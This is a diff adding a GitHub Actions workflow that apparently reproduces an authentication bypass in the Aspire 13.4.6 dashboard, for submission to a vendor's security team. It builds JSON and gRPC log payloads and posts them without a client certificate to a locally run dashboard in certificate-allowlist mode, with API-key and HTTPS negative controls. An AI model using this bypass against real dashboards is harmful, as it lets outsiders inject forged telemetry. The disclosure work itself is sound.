@@ -1,0 +1,405 @@
+name: Temporary Aspire 13.4.6 Explicit mTLS Bypass Submit Proof
+
+on:
+  push:
+    branches:
+      - agent/dotnet10-toolchain-20260815
+    paths:
+      - .github/workflows/_temporary-aspire-13-4-6-explicit-mtls-bypass-submit-proof-20260815.yml
+
+permissions:
+  contents: read
+
+concurrency:
+  group: temporary-aspire-13-4-6-explicit-mtls-bypass-submit-proof-20260815
+  cancel-in-progress: false
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 40
+
+    steps:
+      - name: Download and verify official Aspire 13.4.6 release
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p release evidence payloads certs
+          base='https://github.com/microsoft/aspire/releases/download/v13.4.6'
+          archive='aspire-cli-linux-x64-13.4.6.tar.gz'
+          curl --fail --location --retry 4 --retry-all-errors "$base/$archive" -o "release/$archive"
+          curl --fail --location --retry 4 --retry-all-errors "$base/$archive.sha512" -o "release/$archive.sha512"
+          expected="$(awk '{print tolower($1)}' "release/$archive.sha512")"
+          actual="$(sha512sum "release/$archive" | awk '{print tolower($1)}')"
+          printf 'EXPECTED_SHA512=%s\nACTUAL_SHA512=%s\n' "$expected" "$actual" | tee evidence/RELEASE_INTEGRITY.env
+          test "$expected" = "$actual"
+          tar -xzf "release/$archive" -C release
+          aspire_bin="$(find release -type f -name aspire -perm -u+x -print -quit)"
+          test -n "$aspire_bin"
+          printf 'ASPIRE_BIN=%s\n' "$aspire_bin" | tee evidence/ASPIRE_BINARY.env
+          "$aspire_bin" --version | tee evidence/ASPIRE_VERSION.txt
+          cp "release/$archive.sha512" evidence/
+
+      - name: Generate deterministic OTLP payloads and HTTPS control certificate
+        shell: bash
+        run: |
+          set -euo pipefail
+          marker_http='MSRC_ASPIRE_EXPLICIT_MTLS_ALLOWLIST_BYPASS_HTTP_20260815'
+          marker_grpc='MSRC_ASPIRE_EXPLICIT_MTLS_ALLOWLIST_BYPASS_GRPC_20260815'
+          marker_control='MSRC_ASPIRE_APIKEY_NEGATIVE_CONTROL_20260815'
+          timestamp_nano="$(($(date +%s) * 1000000000))"
+
+          make_json_payload() {
+            local service_name="$1"
+            local marker="$2"
+            local output="$3"
+            cat > "$output" <<EOF
+          {
+            "resourceLogs": [{
+              "resource": {
+                "attributes": [
+                  {"key": "service.name", "value": {"stringValue": "$service_name"}},
+                  {"key": "service.instance.id", "value": {"stringValue": "instance-1"}}
+                ]
+              },
+              "scopeLogs": [{
+                "scope": {"name": "msrc-reproducer", "version": "1.0.0"},
+                "logRecords": [{
+                  "timeUnixNano": "$timestamp_nano",
+                  "observedTimeUnixNano": "$timestamp_nano",
+                  "severityNumber": 17,
+                  "severityText": "ERROR",
+                  "body": {"stringValue": "$marker"},
+                  "attributes": [
+                    {"key": "proof.marker", "value": {"stringValue": "$marker"}},
+                    {"key": "client.certificate.presented", "value": {"boolValue": false}}
+                  ]
+                }]
+              }]
+            }]
+          }
+          EOF
+          }
+
+          make_json_payload 'msrc-explicit-mtls-http-bypass' "$marker_http" payloads/http-bypass.json
+          make_json_payload 'msrc-api-key-negative-control' "$marker_control" payloads/api-key-control.json
+          make_json_payload 'msrc-https-no-cert-control' 'MSRC_ASPIRE_HTTPS_NO_CERT_CONTROL_20260815' payloads/https-control.json
+
+          python3 - <<'PY'
+          from pathlib import Path
+          import struct
+          import time
+
+          marker = 'MSRC_ASPIRE_EXPLICIT_MTLS_ALLOWLIST_BYPASS_GRPC_20260815'
+          service = 'msrc-explicit-mtls-grpc-bypass'
+          now = int(time.time()) * 1_000_000_000
+
+          def varint(value: int) -> bytes:
+              out = bytearray()
+              while True:
+                  b = value & 0x7f
+                  value >>= 7
+                  if value:
+                      out.append(b | 0x80)
+                  else:
+                      out.append(b)
+                      return bytes(out)
+
+          def key(field: int, wire: int) -> bytes:
+              return varint((field << 3) | wire)
+
+          def length_delimited(field: int, value: bytes) -> bytes:
+              return key(field, 2) + varint(len(value)) + value
+
+          def text(field: int, value: str) -> bytes:
+              return length_delimited(field, value.encode('utf-8'))
+
+          def integer(field: int, value: int) -> bytes:
+              return key(field, 0) + varint(value)
+
+          def fixed64(field: int, value: int) -> bytes:
+              return key(field, 1) + struct.pack('<Q', value)
+
+          def any_string(value: str) -> bytes:
+              return text(1, value)
+
+          def any_bool(value: bool) -> bytes:
+              return integer(2, 1 if value else 0)
+
+          def kv(name: str, any_value: bytes) -> bytes:
+              return text(1, name) + length_delimited(2, any_value)
+
+          resource = b''.join([
+              length_delimited(1, kv('service.name', any_string(service))),
+              length_delimited(1, kv('service.instance.id', any_string('instance-1'))),
+          ])
+          scope = text(1, 'msrc-reproducer') + text(2, '1.0.0')
+          log_record = b''.join([
+              fixed64(1, now),
+              integer(2, 17),
+              text(3, 'ERROR'),
+              length_delimited(5, any_string(marker)),
+              length_delimited(6, kv('proof.marker', any_string(marker))),
+              length_delimited(6, kv('client.certificate.presented', any_bool(False))),
+              fixed64(11, now),
+          ])
+          scope_logs = length_delimited(1, scope) + length_delimited(2, log_record)
+          resource_logs = length_delimited(1, resource) + length_delimited(2, scope_logs)
+          request = length_delimited(1, resource_logs)
+          frame = b'\x00' + len(request).to_bytes(4, 'big') + request
+          Path('payloads/grpc-frame.bin').write_bytes(frame)
+          Path('payloads/grpc-message.bin').write_bytes(request)
+          Path('payloads/grpc-metadata.txt').write_text(
+              f'service={service}\nmarker={marker}\nprotobuf_message_bytes={len(request)}\ngrpc_frame_bytes={len(frame)}\n',
+              encoding='utf-8')
+          PY
+
+          openssl req -x509 -newkey rsa:2048 -nodes \
+            -keyout certs/server.key -out certs/server.crt \
+            -subj '/CN=localhost' -days 2 \
+            -addext 'subjectAltName=DNS:localhost,IP:127.0.0.1' >/dev/null 2>&1
+          openssl pkcs12 -export -out certs/server.pfx \
+            -inkey certs/server.key -in certs/server.crt \
+            -passout pass:AspireProof2026 >/dev/null 2>&1
+          openssl x509 -in certs/server.crt -noout -fingerprint -sha256 > evidence/HTTPS_SERVER_CERT_FINGERPRINT.txt
+          sha256sum payloads/* certs/server.crt > evidence/INPUT_SHA256SUMS
+
+      - name: Execute explicit allowlist bypass matrix
+        shell: bash
+        run: |
+          set -euo pipefail
+          aspire_bin="$(cut -d= -f2- evidence/ASPIRE_BINARY.env)"
+          export CI=true
+          export NO_COLOR=1
+          export ASPIRE_INTERACTIVITY_ENABLED=false
+          export ASPIRE_CLI_TELEMETRY_OPTOUT=1
+          export DOTNET_CLI_TELEMETRY_OPTOUT=1
+          export DOTNET_NOLOGO=1
+
+          readback_key='readback-key-20260815'
+          required_otlp_key='required-otlp-key-20260815'
+          allow_thumbprint='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+          marker_http='MSRC_ASPIRE_EXPLICIT_MTLS_ALLOWLIST_BYPASS_HTTP_20260815'
+          marker_grpc='MSRC_ASPIRE_EXPLICIT_MTLS_ALLOWLIST_BYPASS_GRPC_20260815'
+          marker_control='MSRC_ASPIRE_APIKEY_NEGATIVE_CONTROL_20260815'
+
+          printf 'EXPLICIT_ALLOWED_CERT_SHA256=%s\nCLIENT_CERTIFICATE_PRESENTED=0\n' "$allow_thumbprint" \
+            | tee evidence/EXPLICIT_ALLOWLIST.env
+
+          start_dashboard() {
+            local name="$1"
+            local auth_mode="$2"
+            local otlp_key="$3"
+            local thumbprint="$4"
+            local frontend_port="$5"
+            local grpc_url="$6"
+            local http_url="$7"
+            local use_server_cert="$8"
+            local log="evidence/${name}.dashboard.log"
+
+            (
+              export DASHBOARD__OTLP__AUTHMODE="$auth_mode"
+              if [[ -n "$otlp_key" ]]; then
+                export DASHBOARD__OTLP__PRIMARYAPIKEY="$otlp_key"
+              else
+                unset DASHBOARD__OTLP__PRIMARYAPIKEY || true
+              fi
+              if [[ -n "$thumbprint" ]]; then
+                export DASHBOARD__OTLP__ALLOWEDCERTIFICATES__0__THUMBPRINT="$thumbprint"
+              else
+                unset DASHBOARD__OTLP__ALLOWEDCERTIFICATES__0__THUMBPRINT || true
+              fi
+              export DASHBOARD__API__DISABLED=false
+              export DASHBOARD__API__AUTHMODE=ApiKey
+              export DASHBOARD__API__PRIMARYAPIKEY="$readback_key"
+              if [[ "$use_server_cert" = 1 ]]; then
+                export ASPNETCORE_Kestrel__Certificates__Default__Path="$GITHUB_WORKSPACE/certs/server.pfx"
+                export ASPNETCORE_Kestrel__Certificates__Default__Password='AspireProof2026'
+              else
+                unset ASPNETCORE_Kestrel__Certificates__Default__Path || true
+                unset ASPNETCORE_Kestrel__Certificates__Default__Password || true
+              fi
+              printf 'AUTH_MODE=%s\nOTLP_GRPC_URL=%s\nOTLP_HTTP_URL=%s\nALLOWLIST_CONFIGURED=%s\nCLIENT_CERTIFICATE_PRESENTED=0\n' \
+                "$auth_mode" "$grpc_url" "$http_url" "$([[ -n "$thumbprint" ]] && echo 1 || echo 0)" \
+                > "evidence/${name}.configuration.env"
+              exec setsid "$aspire_bin" dashboard run \
+                --frontend-url "http://127.0.0.1:$frontend_port" \
+                --otlp-grpc-url "$grpc_url" \
+                --otlp-http-url "$http_url"
+            ) > "$log" 2>&1 &
+
+            DASHBOARD_PID=$!
+            DASHBOARD_FRONTEND_PORT="$frontend_port"
+
+            local ready=0
+            for _ in $(seq 1 360); do
+              if curl --silent --output /dev/null --connect-timeout 1 "http://127.0.0.1:$frontend_port/"; then
+                ready=1
+                break
+              fi
+              if ! kill -0 "$DASHBOARD_PID" 2>/dev/null; then
+                break
+              fi
+              sleep 0.25
+            done
+            printf 'READY=%s\nPID=%s\n' "$ready" "$DASHBOARD_PID" > "evidence/${name}.startup.env"
+            test "$ready" -eq 1
+          }
+
+          stop_dashboard() {
+            kill -TERM -- "-$DASHBOARD_PID" 2>/dev/null || true
+            kill -TERM "$DASHBOARD_PID" 2>/dev/null || true
+            for _ in $(seq 1 50); do
+              kill -0 "$DASHBOARD_PID" 2>/dev/null || break
+              sleep 0.1
+            done
+            kill -KILL -- "-$DASHBOARD_PID" 2>/dev/null || true
+            kill -KILL "$DASHBOARD_PID" 2>/dev/null || true
+            wait "$DASHBOARD_PID" 2>/dev/null || true
+          }
+
+          readback_marker() {
+            local name="$1"
+            local resource="$2"
+            local marker="$3"
+            local status='000'
+            local present=0
+            for _ in $(seq 1 50); do
+              status="$(curl --silent --show-error \
+                --connect-timeout 3 --max-time 10 \
+                --header "X-API-Key: $readback_key" \
+                --dump-header "evidence/${name}.readback.headers" \
+                --output "evidence/${name}.readback.json" \
+                --write-out '%{http_code}' \
+                "http://127.0.0.1:$DASHBOARD_FRONTEND_PORT/api/telemetry/logs?resource=$resource&limit=20" || true)"
+              if [[ "$status" = 200 ]] && grep -Fq "$marker" "evidence/${name}.readback.json"; then
+                present=1
+                break
+              fi
+              sleep 0.2
+            done
+            printf 'READBACK_STATUS=%s\nMARKER_PRESENT=%s\n' "$status" "$present" > "evidence/${name}.readback.env"
+          }
+
+          # Positive control 1: explicit certificate allowlist, HTTP OTLP, no client certificate.
+          start_dashboard '01-http-explicit-mtls-allowlist-bypass' 'ClientCertificate' '' "$allow_thumbprint" \
+            35680 'http://0.0.0.0:35681' 'http://0.0.0.0:35682' 0
+          http_post_status="$(curl --silent --show-error \
+            --connect-timeout 3 --max-time 10 \
+            --request POST \
+            --header 'Content-Type: application/json' \
+            --data-binary @payloads/http-bypass.json \
+            --dump-header evidence/01-http-explicit-mtls-allowlist-bypass.post.headers \
+            --output evidence/01-http-explicit-mtls-allowlist-bypass.post.body \
+            --write-out '%{http_code}' \
+            'http://127.0.0.1:35682/v1/logs')"
+          printf 'POST_STATUS=%s\nCLIENT_CERTIFICATE_PRESENTED=0\n' "$http_post_status" \
+            > evidence/01-http-explicit-mtls-allowlist-bypass.post.env
+          readback_marker '01-http-explicit-mtls-allowlist-bypass' 'msrc-explicit-mtls-http-bypass' "$marker_http"
+          stop_dashboard
+
+          # Positive control 2: same explicit allowlist bypass over cleartext HTTP/2 gRPC.
+          start_dashboard '02-h2c-grpc-explicit-mtls-allowlist-bypass' 'ClientCertificate' '' "$allow_thumbprint" \
+            35780 'http://0.0.0.0:35781' 'http://0.0.0.0:35782' 0
+          set +e
+          curl --silent --show-error --http2-prior-knowledge \
+            --connect-timeout 3 --max-time 10 \
+            --request POST \
+            --header 'Content-Type: application/grpc' \
+            --header 'TE: trailers' \
+            --data-binary @payloads/grpc-frame.bin \
+            --dump-header evidence/02-h2c-grpc-explicit-mtls-allowlist-bypass.post.headers \
+            --output evidence/02-h2c-grpc-explicit-mtls-allowlist-bypass.post.body \
+            --write-out '%{http_code}' \
+            'http://127.0.0.1:35781/opentelemetry.proto.collector.logs.v1.LogsService/Export' \
+            > evidence/02-h2c-grpc-explicit-mtls-allowlist-bypass.http-status.txt \
+            2> evidence/02-h2c-grpc-explicit-mtls-allowlist-bypass.curl.stderr
+          grpc_curl_rc=$?
+          set -e
+          grpc_http_status="$(cat evidence/02-h2c-grpc-explicit-mtls-allowlist-bypass.http-status.txt)"
+          printf 'CURL_RC=%s\nHTTP_STATUS=%s\nCLIENT_CERTIFICATE_PRESENTED=0\n' "$grpc_curl_rc" "$grpc_http_status" \
+            > evidence/02-h2c-grpc-explicit-mtls-allowlist-bypass.post.env
+          readback_marker '02-h2c-grpc-explicit-mtls-allowlist-bypass' 'msrc-explicit-mtls-grpc-bypass' "$marker_grpc"
+          stop_dashboard
+
+          # Negative control 1: API-key mode rejects the same unauthenticated HTTP write.
+          start_dashboard '03-api-key-negative-control' 'ApiKey' "$required_otlp_key" '' \
+            35880 'http://0.0.0.0:35881' 'http://0.0.0.0:35882' 0
+          api_post_status="$(curl --silent --show-error \
+            --connect-timeout 3 --max-time 10 \
+            --request POST \
+            --header 'Content-Type: application/json' \
+            --data-binary @payloads/api-key-control.json \
+            --dump-header evidence/03-api-key-negative-control.post.headers \
+            --output evidence/03-api-key-negative-control.post.body \
+            --write-out '%{http_code}' \
+            'http://127.0.0.1:35882/v1/logs')"
+          printf 'POST_STATUS=%s\nOTLP_API_KEY_PRESENTED=0\n' "$api_post_status" \
+            > evidence/03-api-key-negative-control.post.env
+          readback_marker '03-api-key-negative-control' 'msrc-api-key-negative-control' "$marker_control"
+          stop_dashboard
+
+          # Negative control 2: HTTPS with ClientCertificate mode does not accept a request without a client certificate.
+          start_dashboard '04-https-client-certificate-negative-control' 'ClientCertificate' '' "$allow_thumbprint" \
+            35980 'https://0.0.0.0:35981' 'https://0.0.0.0:35982' 1
+          set +e
+          curl --silent --show-error --insecure \
+            --connect-timeout 3 --max-time 10 \
+            --request POST \
+            --header 'Content-Type: application/json' \
+            --data-binary @payloads/https-control.json \
+            --dump-header evidence/04-https-client-certificate-negative-control.post.headers \
+            --output evidence/04-https-client-certificate-negative-control.post.body \
+            --write-out '%{http_code}' \
+            'https://127.0.0.1:35982/v1/logs' \
+            > evidence/04-https-client-certificate-negative-control.http-status.txt \
+            2> evidence/04-https-client-certificate-negative-control.curl.stderr
+          https_curl_rc=$?
+          set -e
+          https_http_status="$(cat evidence/04-https-client-certificate-negative-control.http-status.txt)"
+          printf 'CURL_RC=%s\nHTTP_STATUS=%s\nCLIENT_CERTIFICATE_PRESENTED=0\n' "$https_curl_rc" "$https_http_status" \
+            > evidence/04-https-client-certificate-negative-control.post.env
+          readback_marker '04-https-client-certificate-negative-control' 'msrc-https-no-cert-control' 'MSRC_ASPIRE_HTTPS_NO_CERT_CONTROL_20260815'
+          stop_dashboard
+
+          http_readback_status="$(sed -n 's/^READBACK_STATUS=//p' evidence/01-http-explicit-mtls-allowlist-bypass.readback.env)"
+          http_marker_present="$(sed -n 's/^MARKER_PRESENT=//p' evidence/01-http-explicit-mtls-allowlist-bypass.readback.env)"
+          grpc_readback_status="$(sed -n 's/^READBACK_STATUS=//p' evidence/02-h2c-grpc-explicit-mtls-allowlist-bypass.readback.env)"
+          grpc_marker_present="$(sed -n 's/^MARKER_PRESENT=//p' evidence/02-h2c-grpc-explicit-mtls-allowlist-bypass.readback.env)"
+          api_marker_present="$(sed -n 's/^MARKER_PRESENT=//p' evidence/03-api-key-negative-control.readback.env)"
+          https_marker_present="$(sed -n 's/^MARKER_PRESENT=//p' evidence/04-https-client-certificate-negative-control.readback.env)"
+
+          candidate=0
+          if [[ "$http_post_status" = 200 && "$http_readback_status" = 200 && "$http_marker_present" = 1 && \
+                "$grpc_curl_rc" = 0 && "$grpc_http_status" = 200 && "$grpc_readback_status" = 200 && "$grpc_marker_present" = 1 && \
+                "$api_post_status" = 401 && "$api_marker_present" = 0 && \
+                "$https_http_status" != 200 && "$https_marker_present" = 0 ]]; then
+            candidate=1
+          fi
+
+          printf 'HTTP_EXPLICIT_ALLOWLIST_POST_STATUS=%s\nHTTP_EXPLICIT_ALLOWLIST_MARKER_PRESENT=%s\nH2C_GRPC_EXPLICIT_ALLOWLIST_CURL_RC=%s\nH2C_GRPC_EXPLICIT_ALLOWLIST_HTTP_STATUS=%s\nH2C_GRPC_EXPLICIT_ALLOWLIST_MARKER_PRESENT=%s\nAPIKEY_CONTROL_POST_STATUS=%s\nAPIKEY_CONTROL_MARKER_PRESENT=%s\nHTTPS_NO_CLIENT_CERT_CURL_RC=%s\nHTTPS_NO_CLIENT_CERT_HTTP_STATUS=%s\nHTTPS_NO_CLIENT_CERT_MARKER_PRESENT=%s\nCANDIDATE_EXPLICIT_MTLS_AUTH_BYPASS=%s\n' \
+            "$http_post_status" "$http_marker_present" \
+            "$grpc_curl_rc" "$grpc_http_status" "$grpc_marker_present" \
+            "$api_post_status" "$api_marker_present" \
+            "$https_curl_rc" "$https_http_status" "$https_marker_present" "$candidate" \
+            | tee evidence/FINAL_VERDICT.env
+
+          cp payloads/http-bypass.json payloads/api-key-control.json payloads/grpc-metadata.txt evidence/
+          cp payloads/grpc-message.bin payloads/grpc-frame.bin evidence/
+          (
+            cd evidence
+            find . -type f ! -name SHA256SUMS -print0 | sort -z | xargs -0 sha256sum > SHA256SUMS
+          )
+
+          test "$candidate" -eq 1
+
+      - name: Upload exact release proof
+        if: always()
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
+        with:
+          name: aspire-13.4.6-explicit-mtls-bypass-submit-proof-20260815
+          path: evidence
+          retention-days: 1
+          if-no-files-found: error
+          compression-level: 9
+          include-hidden-files: true
